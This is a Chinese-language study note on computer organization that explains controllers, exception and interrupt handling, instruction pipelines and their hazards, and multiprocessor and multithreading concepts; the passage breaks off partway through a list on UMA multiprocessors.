<h3> 控制器的功能和工作原理</h3>
<h4> 控制器的结构和功能</h4>
<p>计算机硬件系统的五大功能部件：<strong>运算器部件、控制器部件、内存储器、输入设备和输出设备</strong> 通过数据总线、地址总线和控制总线连接在一起。现对其主要连接关系简单说明如下：</p>
<ul>
<li>运算器部件通过数据总线与内存储器、输入设备和输出设备传送数据</li>
<li>输入设备和输出设备通过接口电路与总线相连接</li>
<li>内存储器、输入设备和输出设备从地址总线接收地址信息，从控制总线得到控制信号，通过数据总线与其他部件传送数据</li>
<li>控制器部件从数据总线接收指令信息，从运算器部件接收指令转移地址，送出指令地址到地址总线，还要向系统中的部件提供它们运行所需要的控制信号</li>
</ul>
<p>控制器是计算机系统的指挥中心，<strong>控制器的主要功能有：</strong></p>
<ul>
<li>从主存中取出一条指令，并指出下一条指令在主存中的位置</li>
<li>对指令进行译码或测试，产生相应的操作控制信号，以便启动规定的动作</li>
<li>指挥并控制 CPU、主存、输入和输出设备之间的数据流动方向</li>
</ul>
<p>根据控制器产生微操作控制信号的方式的不同，控制器可分为 <strong>硬布线控制器</strong> 和 <strong>微程序控制器</strong>，两类控制器中的 PC 和 IR 是相同的，但确定和表示指令执行步骤的办法以及给出控制各部件运行所需要的控制信号的方案是不同的。</p>
<h4> 硬布线控制器</h4>
<p>硬布线控制器的 <strong>基本原理</strong> 是根据指令的要求、当前的时序及外部和内部的状态，按时间的顺序发送一系列微操作控制信号。它由复杂的组合逻辑门电路和一些触发器构成，因此又称组合逻辑控制器。</p>
<ol>
<li>
<p><strong>硬线控制单元</strong></p>
<p>指令的操作码是决定控制单元发出不同操作命令（控制信号）的关键。为了简化控制单元（CU）的逻辑，将指令的操作码译码和节拍发生器从 CU 分离出来，便可得到简化的控制单元图。</p>
<p>CU 的输入信号来源：</p>
<ul>
<li>经指令译码器译码产出的指令信息</li>
<li>时序系统产生的机器周期信号和节拍信号</li>
<li>来自执行单元的反馈信息即标志</li>
</ul>
</li>
<li>
<p><strong>硬布线控制器的时序系统及微操作</strong></p>
<ul>
<li><strong>时钟周期</strong>：用时钟信号控制节拍发生器，可以产生节拍，每个节拍的宽度正好对应一个时钟周期。在每个节拍内机器可完成一个或几个需同时执行的操作</li>
<li><strong>机器周期</strong>：机器周期可视为所有指令执行过程中的一个基准时间。不同指令的操作不同，指令周期也不同。访问一次存储器的时间是固定的，因此通常以存取周期作为基准时间，即内存中读取一个指令字的最短时间作为机器周期。在存储字长等于指令字长的前提下，取指周期也可视为机器周期。在一个机器周期里可完成若干微操作，每个微操作都需一定的时间，可用时钟信号来控制产生每个微操作命令</li>
<li><strong>指令周期</strong>：详见 <a href="#%E6%8C%87%E4%BB%A4%E5%91%A8%E6%9C%9F">指令周期</a></li>
<li><strong>微操作命令分析</strong>：控制单元具有发出各种操作命令（控制信号）序列的功能。这些命令与指令有关，而且必须按一定次序发出，才能使机器有序地工作</li>
</ul>
<p>执行程序的过程中，对于不同的指令，控制单元需发出各种不同的微操作命令。一条指令分为三个工作周期：取指周期、间址周期和执行周期。</p>
</li>
<li>
<p><strong>CPU 的控制方式</strong></p>
<p>控制单元控制一条指令执行的过程，实质上是依次执行一个确定的微操作序列的过程。由于不同指令所对应的微操作数及复杂程度不同，因此每条指令和每个微操作所需的执行时间也不同。主要有以下三种控制方式：</p>
<ul>
<li><strong>同步控制方式</strong>：指系统有一个统一的时钟，所有的控制信号均来自这个统一的时钟信号。通常以最长的微操作序列和最烦琐的微操作作为标准，采取完全统一的、具有相同时间间隔和相同数目的节拍作为机器周期来运行不同的指令。同步控制方式的优点是控制电路简单，缺点是运行速度慢</li>
<li><strong>异步控制方式</strong>：异步控制方式不存在基准时标信号，各部件按自身固有的速度工作，通过应答方式进行联络。异步控制方式的优点是运行速度快，缺点是控制电路比较复杂</li>
<li><strong>联合控制方式</strong>：联合控制方式是介于同步、异步之间的一种折中。这种方式对各种不同的指令的微操作实行大部分采用同步控制、小部分采用异步控制的办法</li>
</ul>
</li>
<li>
<p><strong>硬布线控制单元设计步骤</strong></p>
<ul>
<li><strong>列出微操作命令的操作时间表</strong>：先根据微操作节拍安排，列出微操作命令的操作时间表。操作时间表中包括各个机器周期、节拍下的每条指令完成的微操纵控制信号</li>
<li><strong>进行微操作信号综合</strong>：在列出微操作时间表后，即可对它们进行综合分析、归类，根据微操作时间表可写出各微操作控制信号的逻辑表达式并进行适当的简化</li>
<li><strong>画出微操作命令的逻辑图</strong>：根据逻辑表达式可画出对应每个微操作信号的逻辑电路图，并用逻辑门电路实现</li>
</ul>
</li>
</ol>
<h4> 微程序控制器</h4>
<p>微程序控制器采用存储逻辑实现，也就是把微操作信号代码化，使每条机器指令转化成为一段微程序并存入一个专门的存储器（控制存储器）中，微操作控制信号由微指令产生。</p>
<ol>
<li>
<p><strong>微程序控制的基本概念</strong></p>
<p>微程序设计思想就是将每条机器指令编写成一个微程序，每个微程序包含若干微指令，每条微指令对应一个或几个微操作命令。这些微程序可以存到一个控制存储器中，用寻址用户程序机器指令的办法来寻址每个微程序中的微指令。目前，大多数计算机都采用微程序设计技术。</p>
<p>微程序设计技术涉及的 <strong>基本术语如下：</strong></p>
<ul>
<li>
<p><strong>微命令与微操作</strong>：一条机器指令可以分解成一个微操作序列，这些微操作是计算机中最基本的、不可再分解的操作。在微程序控制的计算机中，将控制部件向执行部件发出的各种控制命令称为微命令，它是构成控制序列的最小单位。微命令和微操作是一一对应的。微命令是微操作的控制信号，微操作是微命令的执行过程</p>
</li>
<li>
<p><strong>微指令与微周期</strong>：微指令是若干微命令的集合。存放微指令的控制存储器的单元地址称为微地址。一条微指令通常至少包含两大部分信息：</p>
<ul>
<li><strong>操作控制字段</strong>：又称微操作码字段，用于产生某一步操作所需的各种操作控制信号</li>
<li><strong>顺序控制字段</strong>：又称微地址码字段，用于控制产生下一条要执行的微指令地址</li>
</ul>
<p>微周期是指执行一条微指令所需的时间，通常为一个时钟周期。</p>
</li>
<li>
<p><strong>主存储器与控制存储器</strong>：主存储器用于存放程序和数据，在 CPU 外部，用 RAM 实现；控制存储器（CM）用于存放微程序，在 CPU 内部用 ROM 实现</p>
</li>
<li>
<p><strong>程序与微程序</strong>：程序是指令的有序集合，用于完成特定的功能；微程序是微指令的有序集合，一条指令的功能由一段微程序来实现</p>
</li>
</ul>
</li>
<li>
<p><strong>微程序控制器组成和工作过程</strong></p>
<ul>
<li>
<p><strong>微程序组成</strong></p>
<ul>
<li><strong>控制存储器</strong>：它是微程序控制器的核心部件，用于存放各指令对应的微程序，控制存储器可用只读存储器 ROM 构成</li>
<li><strong>微指令寄存器</strong>：用于存放从 CM 中取出的微指令，它的位数同微指令字长相等</li>
<li><strong>微地址形成部件</strong>：用于产生初始微地址和后继微地址，以保证微指令的连续执行</li>
<li><strong>微地址寄存器</strong>：接收微地址形成部件送来的微地址，为在 CM 中读取微指令作准备</li>
</ul>
</li>
<li>
<p><strong>微程序控制器的工作过程</strong></p>
<p>实际上就是在微程序控制器的控制下计算机执行机器指令的过程，这个过程可以描述如下：</p>
<ol>
<li>执行取微指令公共操作。在机器开始运行时，自动将取指微程序的入口地址送入 CMAR，并从 CM 中读出相应的微指令送入 CMDR。取指微程序的入口地址一般为 CM 的 0 号单元，当取指微程序执行完后，从主存中取出的机器指令就已存入指令寄存器中</li>
<li>由机器指令的操作码字段通过微地址形成部件产生该机器指令所对应的微程序的入口地址，并送入 CMAR</li>
<li>从 CM 中逐条取出对应的微指令并执行</li>
<li>执行完对应于一条机器指令的一个微程序后，又回到取指微程序的入口地址，继续第一步，以完成取下一条机器指令的公共操作</li>
</ol>
</li>
</ul>
</li>
<li>
<p><strong>微程序和机器指令</strong></p>
<p>通常，一条机器指令对应一个微程序。由于任何机器指令的取指令操作都是相同的，因此可将取指令操作的微命令统一编成一个微程序，这个微程序只负责将指令从主存单元中取出并送至指令寄存器。此外，也可编出对应间址周期的微程序和中断周期的微程序。这样，控制存储器中的微程序个数应为机器指令数再加上对应取指、间址和中断周期等公共的微程序数。</p>
</li>
</ol>
<h3> 异常和中断机制</h3>
<p>现代计算机中都配有完善的异常和中断处理系统，CPU 的数据通路中有相应的异常检测和响应逻辑，外设接口中有相应的中断请求和控制逻辑，操作系统中有相应的中断服务程序。这些中断硬件线路和中断服务程序有机结合，共同完成异常和中断的处理过程。</p>
<h4> 异常和中断的基本概念</h4>
<p>由 CPU 内部产生的意外事件被称为异常，又称内中断。来自 CPU 外部的设备向 CPU 发出的中断请求被称为中断，通常用于信息的输入和输出，又称外中断。异常是 CPU 执行一条指令时，由 CPU 在其内部检测到的、与正在执行的指令相关的同步事件；中断是一种典型的由外部设备触发的、与当前正在执行的指令无关的异步事件。</p>
<p><strong>异常和中断处理过程</strong> 大致描述如下：当 CPU 在执行用户程序的第 <code>i</code> 条指令时检测到一个异常事件，或者在执行第 <code>i</code> 条指令后发现一个中断请求信号，则 CPU 打断当前用户程序，然后转到相应的异常或中断处理程序去执行。若异常或中断处理程序能够解决相应的问题，则在异常或中断处理程序的最后，CPU 通过执行异常或中断返回指令，回到被打断的用户程序的第 <code>i</code> 条指令或第 <code>i + 1</code> 条指令继续执行；若异常或中断处理程序发现是不可恢复的致命错误，则终止用户程序。通常情况下，对异常和中断的具体处理过程由操作系统（和驱动程序）完成。</p>
<h4> 异常和中断的分类</h4>
<ol>
<li>
<p><strong>异常分类</strong></p>
<p>异常是由 CPU 内部产生的意外事件，分为 <strong>硬故障中断</strong> 和 <strong>程序性异常</strong>。硬故障中断是由硬连线出现异常引起的，如：存储器校验错、总线错误等。程序性异常也称软件中断，是指在 CPU 内部因执行指令而引起的异常事件。如：整除 0、溢出、断点、单步跟踪、非法指令、栈溢出、地址越界、缺页等。按异常发生原因和返回方式的不同，可分为故障、自陷和终止。</p>
<ul>
<li><strong>故障（Fault）</strong>：指在引起故障的指令启动后、执行结束前被检测到的异常事件。例如：指令译码时，出现 “非法操作码”；取数据时，发生 “缺段” 或 “缺页”；执行整数除法指令时，发现 “除数为 0” 等。对于 “缺段” “缺页” 等异常事件，经处理后，可将所需的段或页面从磁盘调入主存，回到发生故障的指令继续执行，断点为当前发生故障的指令；对于 “非法操作码” “除数为 0” 等，因为无法通过异常处理程序恢复故障，因此不能回到原断点执行，必须终止进程的执行</li>
<li><strong>自陷（Trap）</strong>：自陷也称陷阱或陷入，它是预先安排的一种 “异常” 事件，就像预先设定的 “陷阱” 一样。通常的做法是：事先在程序中用一条特殊指令或通过某种方式设定特殊控制标志来人为设置一个 “陷阱”，当执行到被设置了 “陷阱” 的指令时，CPU 在执行完自陷指令后，自动根据不同 “陷阱” 类型进行相应的处理，然后返回到自陷指令的下一条指令执行。<strong>注意</strong>，当自陷指令是转移指令时，并不是返回到下一条指令执行，而是返回到转移目标指令执行</li>
</ul>
<p>故障异常和自陷异常属于程序性异常（软件中断）。</p>
<ul>
<li><strong>终止（Abort）</strong>：如果在执行指令的过程中发生了使计算机无法继续执行的硬件故障，如：控制器出错、存储器校验错等，那么程序将无法继续执行，只能终止，此时，调出中断服务程序来重启系统。这种异常与故障和自陷不同，不是由特定指令产生的，而是随机发生的</li>
</ul>
<p>终止异常和外中断属于硬件中断。</p>
</li>
<li>
<p><strong>中断的分类</strong></p>
<p>中断是指来自 CPU 外部、与 CPU 执行指令无关的事件引起的中断，包括 <code>I/O</code> 设备发出的 <code>I/O</code> 中断（如：键盘输入、打印机缺纸等），或发生某种特殊事件（如：用户按 Esc 键、定时器计数时间到）等。外部 <code>I/O</code> 设备通过特定的中断请求信号线向 CPU 提出中断请求，CPU 每执行完一条指令就检查中断请求信号线，如果检测到中断请求，则进入中断响应周期。</p>
<p>中断可分为可屏蔽中断和不可屏蔽中断。</p>
<ul>
<li><strong>可屏蔽中断</strong>：指通过可屏蔽中断请求线 INTR 向 CPU 发出的中断请求。CPU 可以通过在中断控制器中设置相应的屏蔽字来屏蔽它或不屏蔽它，被屏蔽的中断请求将不被送到 CPU</li>
<li><strong>不可屏蔽中断</strong>：指通过专门的不可屏蔽中断请求线 NMI 向 CPU 发出的中断请求，通常是非常紧急的硬件故障，如：电源掉电等。这类中断请求信号不可被屏蔽，以让 CPU 快速处理这类紧急事件</li>
</ul>
</li>
</ol>
<p>中断和异常在本质上是一样的，但它们之间有以下两个重要的 <strong>不同点：</strong></p>
<ol>
<li>“缺页” 或 “溢出” 等异常事件是由特定指令在执行过程中产生的，而中断不和任何指令相关联，也不阻止任何指令的完成。</li>
<li>异常的检测由 CPU 自身完成，不必通过外部的某个信号通知 CPU。对于中断，CPU 必须通过中断请求线获取中断源的信息，才能知道哪个设备发生了何种中断。</li>
</ol>
<h4> 异常和中断响应过程</h4>
<p>CPU 执行指令时，如果发生了异常或中断请求，必须进行相应的处理。从 CPU 检测到异常或中断事件，到调出相应的处理程序，整个过程称为异常和中断的响应。CPU 对异常和中断响应的过程可分为：关中断、保存断点和程序状态、识别异常和中断并转到相应的处理程序。</p>
<ol>
<li>
<p><strong>关中断</strong></p>
<p>在保存断点和程序状态期间，不能被新的中断打断，因此要禁止响应新的中断，即关中断。通常通过设置 “中断允许”（IF）触发器来实现，若 IF 置为 <code>1</code>，则为开中断，表示允许响应中断；若 IF 置为 <code>0</code>，则表示关中断，表示不允许响应中断。</p>
</li>
<li>
<p><strong>保存断点和程序状态</strong></p>
<p>为了能在异常和中断处理后正确返回到被中断的程序继续执行，必须将程序的断点（返回地址）送到栈或特定寄存器中。通常保存在栈中，这是为了支持异常或中断的嵌套。</p>
<p>异常和中断处理后可能还要回到被中断的程序继续执行，被中断时的程序状态字寄存器 PSWR 的内容也需要保存在栈或特定寄存器中，在异常和中断返回时恢复到 PSWR 中。</p>
</li>
<li>
<p><strong>识别异常和中断并转到相应的处理程序</strong></p>
<p>异常和中断源的识别有软件识别和硬件识别两种方式。异常和中断源的识别方式不同，异常大多采用软件识别方式，而中断可以采用软件识别方式或硬件识别方式。</p>
<p><strong>软件识别</strong> 方式是指 CPU 设置一个异常状态寄存器，用于记录异常原因。操作系统使用一个统一的异常或中断查询程序，按优先级顺序查询异常状态寄存器，以检测异常和中断类型，先查询到的先被处理，然后转到内核中相应的处理程序。</p>
<p><strong>硬件识别</strong> 方式又称向量中断，异常或中断处理程序的首地址称为中断向量，所有中断向量都存放在中断向量表中。每个异常或中断都被指定一个中断类型号。在中断向量表中，类型号和中断向量一一对应，因而可以根据类型号快速找到对应的处理程序。</p>
<p>整个响应过程是不可被打断的。中断响应过程结束后，CPU 就从 PC 中取出中断服务程序的第一条指令开始执行，直至中断返回，这部分任务是由 CPU 通过执行中断服务程序完成的，整个中断处理过程是由软/硬件协同实现的。</p>
</li>
</ol>
<h3> 指令流水线</h3>
<p>前面介绍的指令都是在单周期处理机中采用串行方法执行的，同一时刻 CPU 中只有一条指令在执行，因此各功能部件的使用率不高。现代计算机普遍采用指令流水线技术，同一时刻有多条指令在 CPU 的不同功能部件中并发执行，大大提高了功能部件的并行性和程序的执行效率。</p>
<h4> 指令流水线的基本概念</h4>
<p>可从两方面提高处理机的并行性：</p>
<ul>
<li><strong>时间上的并行技术</strong>：将一个任务分解为几个不同的子阶段，每个阶段在不同的功能部件上并行执行，以便在同一时刻能够同时执行多个任务，进而提升系统性能，这种方法被称为 <strong>流水线技术</strong></li>
<li><strong>空间上的并行技术</strong>：在一个处理机内设置多个执行相同任务的功能部件，并让这些功能部件并行工作，这样的处理机被称为 <strong>超标量处理机</strong></li>
</ul>
<ol>
<li>
<p><strong>指令流水的定义</strong></p>
<p>一条指令的执行过程可分解为若干阶段，每个阶段由相应的功能部件完成。如果将各阶段视为相应的流水段，则指令的执行过程就构成了一条指令流水线。</p>
</li>
<li>
<p><strong>流水线的表示方法</strong></p>
<p>只有大量连续任务不断输入流水线，才能充分发挥流水线的性能，而指令的执行正好是连续不断的，非常适合采用流水线技术。对于其他部件级流水线，如：浮点运算流水线，同样也仅适合于提升浮点运算密集型应用的性能，对于单个运算是无法提升性能的。</p>
</li>
</ol>
<h4> 流水线的基本实现</h4>
<p>在单周期实现中，取指（IF）、译码（ID）、执行（EX）、访存（MEM）和写回（WB）这五个功能段是串连在一起的。将程序计数器（PC）的值送入 IF 段取指令，然后依次进入 ID、EX、MEM、WB 段。虽然不是所有指令都必须经历完整的五个阶段，但只能以执行速度最慢的指令作为设计其时钟周期的依据，单周期 CPU 的时钟频率取决于数据通路中的关键路径（最长路径），因此单周期 CPU 指令执行效率不佳。</p>
<ol>
<li>
<p><strong>流水线的数据通路</strong></p>
<p>其中，IF 段包括程序计数器（PC）指令存储器、下条指令地址的计算逻辑；ID 段包括操作控制器、取操作数逻辑、立即数符号扩展模块；EX 段主要包括算术逻辑单元（ALU）、分支地址计算模块；MEM 段主要包括数据存储器读写模块；WB 段主要包括寄存器写入控制模块。</p>
<p>每个流水段后面都需要增加一个 <strong>流水寄存器</strong>，用于锁存本段处理完成的数据和控制信号，以保证本段的执行结果能在下个时钟周期给下一流水段使用，并根据其所连接的功能段来命名。各种寄存器和数据存储器均采用统一时钟 CLK 进行同步，每来一个时钟，就会有一条新的指令进入流水线 IF 段；同时流水寄存器会锁存前段加工处理完成的数据和控制信号，为下一段的功能部件提供数据输入。</p>
</li>
<li>
<p><strong>流水线的控制信号</strong></p>
<p>在某一时刻，每个流水段执行不同指令的某个阶段，每个流水段还需要正在执行指令的对应功能段的控制信号。</p>
<p><strong>控制信号分类：</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">控制信号</th>
<th style="text-align:center">位置</th>
<th style="text-align:center">来源</th>
<th style="text-align:left">功能说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">BranchTaken</td>
<td style="text-align:center">IF</td>
<td style="text-align:center">EX</td>
<td style="text-align:left">分支跳转信号，为 1 表示跳转，由 EX 段的 Branch 信号与 equal 标志进行逻辑与生成</td>
</tr>
<tr>
<td style="text-align:center">RegDst</td>
<td style="text-align:center">ID</td>
<td style="text-align:center">ID</td>
<td style="text-align:left">写入目的寄存器选择，为 1 时目的寄存器为 rd 寄存器；为 0 时为 rt 寄存器</td>
</tr>
<tr>
<td style="text-align:center">RegWrite</td>
<td style="text-align:center">ID</td>
<td style="text-align:center">WB</td>
<td style="text-align:left">控制寄存器堆写操作，为 1 时数据需要写回寄存器堆中的指定寄存器</td>
</tr>
<tr>
<td style="text-align:center">AluSre</td>
<td style="text-align:center">EX</td>
<td style="text-align:center">EX</td>
<td style="text-align:left">ALU 的第二输入选择控制，为 0 时输入寄存器 rt，为 1 时输入扩展后的立即数</td>
</tr>
<tr>
<td style="text-align:center">AluOp</td>
<td style="text-align:center">EX</td>
<td style="text-align:center">EX</td>
<td style="text-align:left">控制 ALU 进行不同运算，具体取值和位宽与 ALU 的设计有关</td>
</tr>
<tr>
<td style="text-align:center">MemWrite</td>
<td style="text-align:center">MEM</td>
<td style="text-align:center">MEM</td>
<td style="text-align:left">控制数据存储器写操作，为 0 时进行读操作，为 1 时进行写操作</td>
</tr>
<tr>
<td style="text-align:center">MemToReg</td>
<td style="text-align:center">WB</td>
<td style="text-align:center">WB</td>
<td style="text-align:left">为 1 时将数据存储器读出数据写回寄存器堆，否则将 ALU 运算结果写回</td>
</tr>
</tbody>
</table>
</li>
</ol>
<h4> 流水线的冒险与处理</h4>
<p>在指令流水线中，可能会遇到一些情况使得流水线无法正确执行后续指令而引起流水线阻塞或停顿，这种现象称为 <strong>流水线冒险</strong>。根据导致冒险的原因不同主要有三种：结构冒险（资源冲突）、数据冒险（数据冲突）和控制冒险（控制冲突）。</p>
<ol>
<li>
<p><strong>结构冒险</strong></p>
<p>由于多条指令在同一时刻争用同一资源而形成的冲突，也称为资源冲突，即 <strong>由硬件资源竞争造成的冲突</strong>，有以下两种解决办法：</p>
<ul>
<li>前一指令访存时，使后一条相关指令（以及其后续指令）暂停一个时钟周期</li>
<li>单独设置数据存储器和指令存储器，使取数和取指令操作各自在不同的存储器中进行。事实上，现代计算机都引入了 <code>Cache</code> 机制，而 L1 Cache 通常采用数据 Cache 和指令 Cache 分离的方式，因而也就避免了资源冲突的发生</li>
</ul>
</li>
<li>
<p><strong>数据冒险</strong></p>
<p>在一个程序中，下一条指令会用到当前指令计算出的结果，此时这两条指令发生数据冲突。当多条指令重叠处理时就会发生冲突，数据冒险可分为三类：</p>
<ul>
<li><strong>写后读（Read After Write，RAW）相关</strong>：表示当前指令将数据写入寄存器后，下一条指令才能从该寄存器读取数据。否则，先读后写，读到的就是错误（旧）数据</li>
<li><strong>读后写（Write After Read，WAR）相关</strong>：表示当前指令读出数据后，下一条指令才能写该寄存器。否则，先写后读，读到的就是错误（新）数据</li>
<li><strong>写后写（Write After Write，W AW）相关</strong>：表示当前指令写入寄存器后，下一条指令才能写该寄存器。否则，下一条指令在当前指令之前写，将使寄存器的值不是最新值</li>
</ul>
<p>解决的办法有以下几种：</p>
<ul>
<li>把遇到数据相关的指令及其后续指令都暂停一至几个时钟周期，直到数据相关问题消失后再继续执行，可分为硬件阻塞（stall）和软件插入 “NOP” 指令两种方法</li>
<li>设置相关专用通路，即不等前一条指令把计算结果写回寄存器组，下一条指令也不再读寄存器组，而直接把前一条指令的 ALU 的计算结果作为自己的输入数据开始计算过程，使本来需要暂停的操作变得可以继续执行，这称为数据旁路技术</li>
<li>通过编译器对数据相关的指令编译优化的方法，调整指令顺序来解决数据相关</li>
</ul>
</li>
<li>
<p><strong>控制冒险</strong></p>
<p>指令通常是顺序执行的，但是在遇到改变指令执行顺序的情况，例如：执行转移、调用或返回等指令时，会改变 PC 值，会造成断流，从而引起控制冒险。解决的办法有以下几种：</p>
<ul>
<li>对转移指令进行分支预测，尽早生成转移目标地址。分支预测分为简单（静态）预测和动态预测。静态预测总是预测条件不满足，即继续执行分支指令的后续指令。动态预测根据程序执行的历史情况，进行动态预测调整，有较高的预测准确率</li>
<li>预取转移成功和不成功两个控制流方向上的自标指令</li>
<li>加快和提前形成条件码</li>
<li>提高转移方向的猜准率</li>
</ul>
</li>
</ol>
<h4> 流水线的性能指标</h4>
<ol>
<li>
<p><strong>流水线的吞吐率</strong></p>
<p>流水线的吞吐率是指在单位时间内流水线所完成的任务数量，或输出结果的数量。</p>
</li>
<li>
<p><strong>流水线的加速比</strong></p>
<p>完成同样一批任务，不使用流水线与使用流水线所用的时间之比。</p>
</li>
</ol>
<h4> 高级流水线技术</h4>
<p>有两种增加指令级并行的策略：一种是多发射技术，它通过采用多个内部功能部件，使流水线功能段能同时处理多条指令，处理机一次可以发射多条指令进入流水线执行；另一种是超流水线技术，它通过增加流水线级数来使更多的指令同时在流水线中重叠执行。</p>
<ol>
<li>
<p><strong>超标量流水线技术</strong></p>
<p>超标量流水线技术也称 <strong>动态多发射技术</strong>，每个时钟周期内可并发多条独立指令，以并行操作方式将两条或多条指令编译并执行，为此需配置多个功能部件。在简单的超标量 CPU 中，指令是按顺序发射执行的。为了更好地提高并行性能，多数超标量 CPU 都结合动态流水线调度技术，通过动态分支预测等手段，指令不按顺序执行，这种执行方式称为乱序执行。</p>
</li>
<li>
<p><strong>超长指令字技术</strong></p>
<p>超长指令字技术也称 <strong>静态多发射技术</strong>，由编译程序挖掘出指令间潜在的并行性，将多条能并行操作的指令组合成一条具有多个操作码字段的超长指令字（可达几百位），为此需要采用多个处理部件。</p>
</li>
<li>
<p><strong>超流水线技术</strong></p>
<p>流水线功能段划分得越多，时钟周期就越短，指令吞吐率也就越高，因此超流水线技术是通过提高流水线主频的方式来提升流水线性能的。但是，流水线级数越多，用于流水寄存器的开销就越大，因而流水线级数是有限制的，并不是越多越好。</p>
</li>
</ol>
<h3> 多处理器的基本概念</h3>
<h4> SISD、SIMD、MIMD 的基本概念</h4>
<p>基于指令流的数量和数据流的数量，将计算机体系结构分为 <code>SISD</code>、<code>SIMD</code>、<code>MISD</code> 和 <code>MIMD</code> 四类。<strong>常规的单处理器</strong> 属于 <code>SISD</code>，而 <strong>常规的多处理器</strong> 属于 <code>MIMD</code>。</p>
<ol>
<li>
<p><strong>单指令流单数据流（SISD）结构</strong></p>
<p><code>SISD</code> 是传统的 <strong>串行计算机结构</strong>，这种计算机通常仅包含一个处理器和一个存储器，处理器在一段时间内仅执行一条指令，按指令流规定的顺序串行执行指令流中的若干条指令。为了提高速度，有些 <code>SISD</code> 计算机采用流水线的方式，因此，SISD 处理器有时会设置多个功能部件，并且采用多模块交叉方式组织存储器。</p>
</li>
<li>
<p><strong>单指令流多数据流（SIMD）结构</strong></p>
<p><code>SIMD</code> 是指一个指令流同时对多个数据流进行处理，一般称为 <strong>数据级并行技术</strong>。这种结构的计算机通常由一个指令控制部件、多个处理单元组成。每个处理单元虽然执行的都是同一条指令，但是每个单元都有自己的地址寄存器，这样每个单元就都有不同的数据地址，因此，不同处理单元执行的同一条指令所处理的数据是不同的。一个顺序应用程序被编译后，可能按 <code>SISD</code> 组织并运行于串行硬件上，也可能按 <code>SIMD</code> 组织并运行于并行硬件上。</p>
<p><code>SIMD</code> 在使用 <code>for</code> 循环处理数组时最有效，比如：一条分别对 <code>16</code> 对数据进行运算的 <code>SIMD</code> 指令如果在 <code>16</code> 个 ALU 中同时运算，则只需要一次运算时间就能完成运算。<code>SIMD</code> 在使用 <code>case</code> 或 <code>switch</code> 语句时效率最低，此时每个执行单元必须根据不同的数据执行不同的操作。</p>
</li>
<li>
<p><strong>多指令流单数据流（MISD）结构</strong></p>
<p><code>MISD</code> 是指同时执行多条指令，处理同一个数据，实际上不存在这样的计算机。</p>
</li>
<li>
<p><strong>多指令流多数据流（MIMD）结构</strong></p>
<p><code>MIMD</code> 是指同时执行多条指令分别处理多个不同的数据，<code>MIMD</code> 分为 <strong>多计算机系统</strong> 和 <strong>多处理器系统</strong>。多计算机系统中的每个计算机节点都具有各自的私有存储器，并且具有独立的主存地址空间，不能通过存取指令来访问不同节点的私有存储器，而要通过消息传递进行数据传送，也称消息传递 <code>MIMD</code>。多处理器系统是共享存储多处理器（SMP）系统的简称，它具有共享的单一地址空间，通过存取指令来访问系统中的所有存储器，也称共享存储 <code>MIMD</code>。</p>
<p>向量处理器是 <code>SIMD</code> 的变体，是一种实现了直接操作一维数组（向量）指令集的 CPU，而串行处理器只能处理单一数据集。其基本理念是将从存储器中收集的一组数据按顺序放到一组向量寄存器中，然后以流水化的方式对它们依次操作，最后将结果写回寄存器。向量处理器在特定工作环境中极大地提升了性能，尤其是在数值模拟或者相似的领域中。</p>
</li>
</ol>
<p><code>SIMD</code> 和 <code>MIMD</code> 是两种并行计算模式，其中 <code>SIMD</code> 是一种数据级并行模式，而 <code>MIMD</code> 是一种并行程度更高的线程级并行或线程级以上并行计算模式。</p>
<h4> 硬件多线程的基本概念</h4>
<p>在传统 CPU 中，线程的切换包含一系列开销，频繁地切换会极大影响系统的性能，为了减少线程切换过程中的开销，便诞生了硬件多线程。在支持硬件多线程的 CPU 中，必须为每个线程提供单独的通用寄存器组、单独的程序计数器等，线程的切换只需激活选中的寄存器，从而省略了与存储器数据交换的环节，大大减少了线程切换的开销。</p>
<p>硬件多线程有三种实现方式：细粒度多线程、粗粒度多线程和同时多线程（SMT）。</p>
<ol>
<li>
<p><strong>细粒度多线程</strong></p>
<p>多个线程之间轮流交叉执行指令，多个线程之间的指令是不相关的，可以乱序并行执行。在这种方式下，处理器能在每个时钟周期切换线程。例如：在时钟周期 <code>i</code>，将线程 <code>A</code> 中的多条指令发射执行；在时钟周期 <code>i + 1</code>，将线程 <code>B</code> 中的多条指令发射执行。</p>
</li>
<li>
<p><strong>粗粒度多线程</strong></p>
<p>仅在一个线程出现了较大开销的阻塞时，才切换线程，如：Cache 缺失。在这种方式下，当发生流水线阻塞时，必须清除被阻塞的流水线，新线程的指令开始执行前需要重载流水线，因此，线程切换的开销比细粒度多线程更大。</p>
</li>
<li>
<p><strong>同时多线程</strong></p>
<p>同时多线程（SMT）是上述两种多线程技术的变体。它在实现指令级并行的同时，实现线程级并行，也就是说，它在同一个时钟周期中，发射多个不同线程中的多条指令执行。</p>
</li>
</ol>
<h4> 多核处理器的基本概念</h4>
<p>多核处理器是指将多个处理单元集成到单个 CPU 中，每个处理单元称为一个核（core）。每个核可以有自已的 Cache，也可以共享同一个 Cache。所有核一般都是对称的，并且共享主存储器，因此多核属于共享存储的对称多处理器。</p>
<p>在多核计算机系统中，如要充分发挥硬件的性能，必须采用多线程（或多进程）执行，使得每个核在同一时刻都有线程在执行。与单核上的多线程不同，多核上的多个线程是在物理上并行执行的，是真正意义上的并行执行，在同一时刻有多个线程在并行执行。而单核上的多线程是一种多线程交错执行，实际上在同一时刻只有一个线程在执行。</p>
<p>假设要将四颗圆石头滚到马路对面，滚动每颗石头平均需花费 <code>1</code> 分钟。串行处理器会逐一滚动每颗石头，花费 <code>4</code> 分钟。拥有两个核的多核处理器让两个人去滚石头，即每人滚两颗，花费 <code>2</code> 分钟。向量处理器找到一根长木板，放在四颗石头后面，推动木板即可同时滚动四块石头，理论上只要力量够大，就只需要 <code>1</code> 分钟。多核处理器相当于拥有多名工人，而向量处理器拥有一种方法，可以同时对多件事进行相同的操作。</p>
<h4> 共享内存多处理器的基本概念</h4>
<p>具有共享的单一物理地址空间的多处理器被称为 <strong>共享内存多处理器（SMP）</strong>。处理器通过存储器中的共享变量互相通信，所有处理器都能通过存取指令访问任何存储器的位置。<strong>注意</strong>，即使这些系统共享同一个物理地址空间，它们仍然可在自己的虚拟地址空间中单独地运行程序。</p>
<p><strong>单一地址空间的多处理器有两种类型：</strong></p>
<ul>
<li><strong>统一存储访问（UMA）多处理器</strong>：每个处理器对所有存储单元的访问时间是大致相同的，即访问时间与哪个处理器提出访存请求及访问哪个字无关。根据处理器与共享存储器之间的连接方式，分为基于总线、基于交叉开关网络和基于多级交换网络连接等几种处理器</li>
